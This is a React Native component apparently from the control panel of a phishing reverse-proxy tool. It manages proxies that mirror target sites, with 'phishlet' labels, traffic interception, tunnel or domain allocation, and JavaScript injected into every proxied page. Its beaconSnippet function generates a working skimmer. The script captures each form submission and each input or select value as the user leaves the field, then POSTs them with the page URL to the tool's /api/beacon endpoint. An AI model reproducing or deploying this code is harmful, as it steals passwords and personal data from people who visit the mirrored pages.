import * as Clipboard from "expo-clipboard";
import {
  ArrowRight,
  Bug,
  Check,
  Code2,
  Copy,
  Globe,
  Loader,
  Network,
  Power,
  Trash2,
  Wand2,
  Zap,
} from "lucide-react-native";
import React, { useState } from "react";
import {
  ActivityIndicator,
  Alert,
  Platform,
  Pressable,
  StyleSheet,
  Text,
  TextInput,
  View,
} from "react-native";
import { theme } from "@/constants/theme";
import {
  useAllocateProxyDomain,
  useDeleteProxy,
  useTunnels,
  useUpdateProxy,
} from "@/hooks/useGateway";
import { getBaseUrl, proxyUrl, type Proxy } from "@/lib/api";
import PressableScale from "./PressableScale";
import PulseDot from "./PulseDot";

// ── Generic beacon snippet ──

function beaconSnippet(gateway: string): string {
  return `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,form:d})});});\ndocument.addEventListener('focusout',function(e){var t=e.target;if(t.tagName!=='INPUT'&&t.tagName!=='SELECT')return;fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,field:t.name||t.id||t.type,value:t.value})});});`;
}

// ── Component ──

type ProxyCardProps = { proxy: Proxy; authHeader?: string };

export default function ProxyCard({ proxy, authHeader }: ProxyCardProps) {
  const update = useUpdateProxy(authHeader);
  const removeProxy = useDeleteProxy(authHeader);
  const { data: tunnelsResult } = useTunnels();
  const allocate = useAllocateProxyDomain(authHeader);

  const [showEdit, setShowEdit] = useState(false);
  const [showInject, setShowInject] = useState(false);
  const [showDomain, setShowDomain] = useState(false);
  const [editName, setEditName] = useState(proxy.name);
  const [editTarget, setEditTarget] = useState(proxy.targetUrl);
  const [injectJs, setInjectJs] = useState(proxy.injectJs ?? "");
  const [domainCopied, setDomainCopied] = useState(false);
  const [urlCopied, setUrlCopied] = useState(false);
  const [hostname, setHostname] = useState("");
  const [domainError, setDomainError] = useState<string | null>(null);

  const tunnels = tunnelsResult?.data ?? [];
  const proxyTunnel = proxy.tunnelId
    ? tunnels.find((t) => t.id === proxy.tunnelId)
    : null;

  const url = proxyUrl(proxy.slug);
  const domainUrl = proxy.proxyDomain ? `https://${proxy.proxyDomain}` : "";
  const tunnelUrl = proxyTunnel
    ? `tcp://0.0.0.0:${proxyTunnel.remotePort}`
    : "";

  const copyUrl = async () => {
    await Clipboard.setStringAsync(url);
    setUrlCopied(true);
    setTimeout(() => setUrlCopied(false), 1400);
  };
  const copyDomain = async () => {
    if (!domainUrl) return;
    await Clipboard.setStringAsync(domainUrl);
    setDomainCopied(true);
    setTimeout(() => setDomainCopied(false), 1400);
  };
  const copyTunnel = async () => {
    if (!tunnelUrl) return;
    await Clipboard.setStringAsync(tunnelUrl);
    setDomainCopied(true);
    setTimeout(() => setDomainCopied(false), 1400);
  };

  const toggle = () => update.mutate({ id: proxy.id, enabled: !proxy.enabled });
  const toggleIntercept = () =>
    update.mutate({ id: proxy.id, interceptEnabled: !proxy.interceptEnabled });
  const toggleInject = () =>
    update.mutate({
      id: proxy.id,
      injectJsEnabled: !proxy.injectJsEnabled,
    });

  const saveEdit = () => {
    const normalised = /^https?:\/\//.test(editTarget.trim())
      ? editTarget.trim()
      : `https://${editTarget.trim()}`;
    update.mutate(
      { id: proxy.id, name: editName.trim(), targetUrl: normalised },
      { onSuccess: () => setShowEdit(false) },
    );
  };

  const saveInject = () => {
    const trimmed = injectJs.trim();
    update.mutate(
      {
        id: proxy.id,
        injectJs: trimmed,
        injectJsEnabled: trimmed.length > 0,
      },
      { onSuccess: () => setShowInject(false) },
    );
  };

  const autoAnalyse = () => {
    setInjectJs(beaconSnippet(getBaseUrl()));
  };

  const allocateDomain = () => {
    const h = hostname.trim().toLowerCase();
    if (!h || !/^[a-z0-9.-]+\.[a-z]{2,}$/.test(h)) {
      setDomainError("Enter a valid hostname.");
      return;
    }
    setDomainError(null);
    allocate.mutate(
      { proxyId: proxy.id, hostname: h },
      { onSuccess: () => setShowDomain(false) },
    );
  };

  const remove = () => {
    const run = () => removeProxy.mutate(proxy.id);
    if (Platform.OS === "web") {
      run();
      return;
    }
    Alert.alert("Remove proxy", `Stop routing "${proxy.name}"?`, [
      { text: "Cancel", style: "cancel" },
      { text: "Remove", style: "destructive", onPress: run },
    ]);
  };

  return (
    <View style={[styles.card, !proxy.enabled && styles.cardOff]}>
      {/* Top row */}
      <View style={styles.cardTop}>
        <View style={styles.topLeft}>
          <PulseDot
            color={proxy.enabled ? theme.colors.ok : theme.colors.textFaint}
            active={proxy.enabled}
            size={8}
          />
          <Text style={styles.name} numberOfLines={1}>
            {proxy.name}
          </Text>
          {proxy.phishlet && (
            <View style={styles.phishBadge}>
              <Wand2 size={9} color={theme.colors.warn} />
            </View>
          )}
        </View>
        <View style={styles.topRight}>
          <View style={styles.hits}>
            <Zap size={11} color={theme.colors.accent} />
            <Text style={styles.hitsText}>{proxy.hits}</Text>
          </View>
          <Pressable
            onPress={() => {
              setShowEdit((v) => !v);
              setEditName(proxy.name);
              setEditTarget(proxy.targetUrl);
            }}
            hitSlop={8}
            style={({ pressed }) => [
              styles.miniBtn,
              pressed && styles.pressed,
              showEdit && styles.miniBtnActive,
            ]}
          >
            <Text
              style={[
                styles.miniBtnText,
                showEdit && styles.miniBtnTextActive,
              ]}
            >
              ✎
            </Text>
          </Pressable>
        </View>
      </View>

      {/* Route line */}
      <View style={styles.route}>
        <Text style={styles.slug} numberOfLines={1}>
          /proxy/{proxy.slug}
        </Text>
        <ArrowRight size={11} color={theme.colors.textFaint} />
        <Text style={styles.target} numberOfLines={1}>
          {proxy.targetUrl.replace(/^https?:\/\//, "")}
        </Text>
      </View>

      {/* Gateway URL */}
      <Pressable
        onPress={copyUrl}
        style={({ pressed }) => [styles.urlRow, pressed && styles.pressed]}
      >
        <Text style={styles.url} numberOfLines={1}>
          {url}
        </Text>
        {urlCopied ? (
          <Check size={14} color={theme.colors.ok} />
        ) : (
          <Copy size={14} color={theme.colors.textDim} />
        )}
      </Pressable>

      {/* Domain / tunnel banner */}
      {proxy.proxyDomain ? (
        <Pressable
          onPress={copyDomain}
          style={({ pressed }) => [
            styles.domainBanner,
            pressed && styles.pressed,
          ]}
        >
          <Globe size={12} color={theme.colors.ok} />
          <Text style={styles.domainText} numberOfLines={1}>
            https://{proxy.proxyDomain}
          </Text>
          {domainCopied ? (
            <Check size={12} color={theme.colors.ok} />
          ) : (
            <Copy size={12} color={theme.colors.textDim} />
          )}
        </Pressable>
      ) : proxyTunnel ? (
        <Pressable
          onPress={copyTunnel}
          style={({ pressed }) => [
            styles.tunnelBanner,
            pressed && styles.pressed,
          ]}
        >
          <Network size={12} color={theme.colors.ok} />
          <View style={styles.tunnelInfo}>
            <Text style={styles.tunnelText} numberOfLines={1}>
              {tunnelUrl}
            </Text>
            <Text style={styles.tunnelStatus}>
              {proxyTunnel.status} ·{" "}
              {proxyTunnel.bytesIn + proxyTunnel.bytesOut} bytes
            </Text>
          </View>
        </Pressable>
      ) : null}

      {/* Domain allocation panel */}
      {showDomain && (
        <View style={styles.domainPanel}>
          <Text style={styles.fieldLabel}>HOSTNAME</Text>
          <TextInput
            value={hostname}
            onChangeText={setHostname}
            style={styles.fieldInput}
            placeholder={`${proxy.slug}.example.com`}
            placeholderTextColor={theme.colors.textFaint}
            autoCapitalize="none"
            autoCorrect={false}
          />
          {domainError ? (
            <Text style={styles.formError}>{domainError}</Text>
          ) : null}
          <PressableScale
            haptic="medium"
            onPress={allocateDomain}
            disabled={allocate.isPending}
            style={styles.saveBtn}
          >
            {allocate.isPending ? (
              <ActivityIndicator size="small" color={theme.colors.bg} />
            ) : (
              <Network size={13} color={theme.colors.bg} />
            )}
            <Text style={styles.saveBtnText}>Create tunnel</Text>
          </PressableScale>
        </View>
      )}

      {/* Edit panel */}
      {showEdit && (
        <View style={styles.editPanel}>
          <Text style={styles.fieldLabel}>NAME</Text>
          <TextInput
            value={editName}
            onChangeText={setEditName}
            style={styles.fieldInput}
            placeholder="Proxy name"
            placeholderTextColor={theme.colors.textFaint}
            autoCapitalize="none"
          />
          <Text style={styles.fieldLabel}>TARGET URL</Text>
          <TextInput
            value={editTarget}
            onChangeText={setEditTarget}
            style={styles.fieldInput}
            placeholder="https://example.com"
            placeholderTextColor={theme.colors.textFaint}
            autoCapitalize="none"
            autoCorrect={false}
            keyboardType="url"
          />
          <PressableScale
            haptic="medium"
            onPress={saveEdit}
            disabled={update.isPending}
            style={styles.saveBtn}
          >
            {update.isPending ? (
              <ActivityIndicator size="small" color={theme.colors.bg} />
            ) : (
              <Check size={13} color={theme.colors.bg} />
            )}
            <Text style={styles.saveBtnText}>Save</Text>
          </PressableScale>
        </View>
      )}

      {/* JS injection toggle */}
      <Pressable
        onPress={() => {
          setShowInject((v) => !v);
          setInjectJs(proxy.injectJs ?? "");
        }}
        style={({ pressed }) => [
          styles.injectToggle,
          pressed && styles.pressed,
          proxy.injectJsEnabled && styles.injectToggleActive,
        ]}
      >
        <Code2
          size={13}
          color={
            proxy.injectJsEnabled
              ? theme.colors.warn
              : theme.colors.textFaint
          }
        />
        <Text
          style={[
            styles.injectToggleText,
            {
              color: proxy.injectJsEnabled
                ? theme.colors.warn
                : theme.colors.textDim,
            },
          ]}
        >
          {proxy.injectJsEnabled
            ? `JS injection active (${proxy.injectJs?.length ?? 0} chars)`
            : showInject
              ? "Hide JS editor"
              : "Inject JavaScript"}
        </Text>
      </Pressable>

      {showInject && (
        <View style={styles.injectPanel}>
          <View style={styles.injectTopRow}>
            <Text style={styles.injectHint}>
              JavaScript injected into every proxied page.
            </Text>
            <PressableScale
              haptic="light"
              onPress={autoAnalyse}
              style={styles.analyseBtn}
            >
              <Wand2 size={11} color={theme.colors.accent} />
              <Text style={styles.analyseText}>Generate</Text>
            </PressableScale>
          </View>
          <TextInput
            value={injectJs}
            onChangeText={setInjectJs}
            placeholder="console.log('injected')"
            placeholderTextColor={theme.colors.textFaint}
            style={styles.injectInput}
            multiline
            autoCapitalize="none"
            autoCorrect={false}
            textAlignVertical="top"
          />
          <View style={styles.injectActions}>
            <Pressable
              onPress={toggleInject}
              disabled={update.isPending}
              style={({ pressed }) => [
                styles.actionBtnSm,
                pressed && styles.pressed,
                proxy.injectJsEnabled && styles.actionBtnSmWarn,
              ]}
            >
              <Power
                size={11}
                color={
                  proxy.injectJsEnabled
                    ? theme.colors.warn
                    : theme.colors.textFaint
                }
              />
              <Text
                style={[
                  styles.actionSmText,
                  {
                    color: proxy.injectJsEnabled
                      ? theme.colors.warn
                      : theme.colors.textDim,
                  },
                ]}
              >
                {proxy.injectJsEnabled ? "On" : "Off"}
              </Text>
            </Pressable>
            <PressableScale
              haptic="medium"
              onPress={saveInject}
              disabled={update.isPending}
              style={styles.injectSaveBtn}
            >
              <Check size={12} color={theme.colors.bg} />
              <Text style={styles.injectSaveText}>Save snippet</Text>
            </PressableScale>
          </View>
        </View>
      )}

      {/* Actions */}
      <View style={styles.actions}>
        <PressableScale
          haptic="medium"
          onPress={toggle}
          disabled={update.isPending}
          style={styles.actionBtn}
        >
          <Power
            size={13}
            color={proxy.enabled ? theme.colors.warn : theme.colors.ok}
          />
          <Text
            style={[
              styles.actionText,
              {
                color: proxy.enabled ? theme.colors.warn : theme.colors.ok,
              },
            ]}
          >
            {proxy.enabled ? "Disable" : "Enable"}
          </Text>
        </PressableScale>
        <PressableScale
          haptic="medium"
          onPress={toggleIntercept}
          disabled={update.isPending}
          style={styles.actionBtn}
        >
          <Bug
            size={13}
            color={
              proxy.interceptEnabled
                ? theme.colors.warn
                : theme.colors.textFaint
            }
          />
          <Text
            style={[
              styles.actionText,
              {
                color: proxy.interceptEnabled
                  ? theme.colors.warn
                  : theme.colors.textDim,
              },
            ]}
          >
            {proxy.interceptEnabled ? "Capturing" : "Intercept"}
          </Text>
        </PressableScale>
        <Pressable
          onPress={() => {
            setShowDomain((v) => !v);
            setHostname("");
            setDomainError(null);
          }}
          style={({ pressed }) => [
            styles.actionBtn,
            pressed && styles.pressed,
            showDomain && styles.actionBtnActive,
          ]}
        >
          <Network
            size={13}
            color={
              proxy.proxyDomain || proxyTunnel
                ? theme.colors.ok
                : showDomain
                  ? theme.colors.accent
                  : theme.colors.textFaint
            }
          />
          <Text
            style={[
              styles.actionText,
              {
                color:
                  proxy.proxyDomain || proxyTunnel
                    ? theme.colors.ok
                    : showDomain
                      ? theme.colors.accent
                      : theme.colors.textDim,
              },
            ]}
          >
            Tunnel
          </Text>
        </Pressable>
        <PressableScale
          haptic="heavy"
          onPress={remove}
          disabled={removeProxy.isPending}
          style={styles.actionBtn}
        >
          <Trash2 size={13} color={theme.colors.danger} />
          <Text style={[styles.actionText, { color: theme.colors.danger }]}>
            Remove
          </Text>
        </PressableScale>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  card: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(3),
  },
  cardOff: { opacity: 0.55 },
  cardTop: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
  },
  topLeft: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    flex: 1,
  },
  name: {
    color: theme.colors.text,
    fontSize: 15,
    fontWeight: "700",
    flexShrink: 1,
  },
  topRight: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
  },
  phishBadge: {
    backgroundColor: "rgba(255,178,62,0.15)",
    borderRadius: 6,
    padding: 3,
  },
  hits: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1),
    backgroundColor: theme.colors.surfaceAlt,
    paddingHorizontal: theme.spacing(2),
    paddingVertical: 2,
    borderRadius: theme.radius.sm,
  },
  hitsText: {
    color: theme.colors.text,
    fontSize: 11,
    fontWeight: "700",
    fontFamily: theme.font.mono,
  },
  miniBtn: {
    width: 24,
    height: 24,
    borderRadius: 5,
    alignItems: "center",
    justifyContent: "center",
    backgroundColor: theme.colors.surfaceAlt,
    borderWidth: 1,
    borderColor: theme.colors.border,
  },
  miniBtnActive: {
    backgroundColor: "rgba(255,178,62,0.15)",
    borderColor: "rgba(255,178,62,0.4)",
  },
  miniBtnText: { color: theme.colors.textDim, fontSize: 13 },
  miniBtnTextActive: { color: theme.colors.warn },
  route: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
  },
  slug: {
    color: theme.colors.accent,
    fontSize: 12,
    fontFamily: theme.font.mono,
    flexShrink: 1,
  },
  target: {
    color: theme.colors.textDim,
    fontSize: 12,
    fontFamily: theme.font.mono,
    flexShrink: 1,
    flex: 1,
  },
  urlRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  url: {
    color: theme.colors.textDim,
    fontSize: 11,
    fontFamily: theme.font.mono,
    flexShrink: 1,
  },
  domainBanner: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: "rgba(60,224,138,0.07)",
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: "rgba(60,224,138,0.25)",
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
  },
  domainText: {
    color: theme.colors.ok,
    fontSize: 12,
    fontFamily: theme.font.mono,
    flex: 1,
  },
  tunnelBanner: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: "rgba(184,255,60,0.07)",
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: "rgba(184,255,60,0.25)",
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
  },
  tunnelInfo: { flex: 1 },
  tunnelText: {
    color: theme.colors.accent,
    fontSize: 11,
    fontFamily: theme.font.mono,
  },
  tunnelStatus: {
    color: theme.colors.textFaint,
    fontSize: 9,
    fontFamily: theme.font.mono,
    marginTop: 1,
  },
  domainPanel: {
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(3),
    gap: theme.spacing(2),
  },
  editPanel: {
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(3),
    gap: theme.spacing(2),
  },
  fieldLabel: {
    color: theme.colors.textFaint,
    fontSize: 10,
    fontWeight: "700",
    letterSpacing: 1,
    fontFamily: theme.font.mono,
  },
  fieldInput: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    color: theme.colors.text,
    fontSize: 12,
    fontFamily: theme.font.mono,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  formError: { color: theme.colors.danger, fontSize: 12 },
  saveBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.accent,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(4),
    paddingVertical: theme.spacing(2.5),
    alignSelf: "flex-end",
  },
  saveBtnText: { color: theme.colors.bg, fontSize: 12, fontWeight: "700" },
  injectToggle: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingVertical: theme.spacing(2.5),
    borderWidth: 1,
    borderColor: "transparent",
  },
  injectToggleActive: { borderColor: theme.colors.warn },
  injectToggleText: { fontSize: 12, fontWeight: "700" },
  injectPanel: {
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.warn,
    padding: theme.spacing(3),
    gap: theme.spacing(2),
  },
  injectTopRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    gap: theme.spacing(2),
  },
  injectHint: {
    color: theme.colors.textDim,
    fontSize: 11,
    fontFamily: theme.font.mono,
    flex: 1,
  },
  analyseBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: 4,
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.accent,
    paddingHorizontal: theme.spacing(2),
    paddingVertical: 4,
    flexShrink: 0,
  },
  analyseText: {
    color: theme.colors.accent,
    fontSize: 10,
    fontWeight: "700",
    fontFamily: theme.font.mono,
  },
  injectInput: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
    color: theme.colors.warn,
    fontSize: 11,
    fontFamily: theme.font.mono,
    minHeight: 80,
    lineHeight: 16,
  },
  injectActions: {
    flexDirection: "row",
    gap: theme.spacing(2),
    justifyContent: "flex-end",
  },
  injectSaveBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1.5),
    backgroundColor: theme.colors.warn,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  injectSaveText: {
    color: theme.colors.bg,
    fontSize: 11,
    fontWeight: "700",
  },
  actions: { flexDirection: "row", gap: theme.spacing(2) },
  actionBtn: {
    flex: 1,
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingVertical: theme.spacing(2.5),
  },
  actionBtnActive: {
    backgroundColor: "rgba(184,255,60,0.12)",
    borderWidth: 1,
    borderColor: theme.colors.accent,
  },
  actionText: { fontSize: 12, fontWeight: "700" },
  actionBtnSm: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(1.5),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(2.5),
    paddingVertical: theme.spacing(2),
  },
  actionBtnSmWarn: { borderWidth: 1, borderColor: theme.colors.warn },
  actionSmText: { fontSize: 10, fontWeight: "700" },
  pressed: { opacity: 0.55 },
});
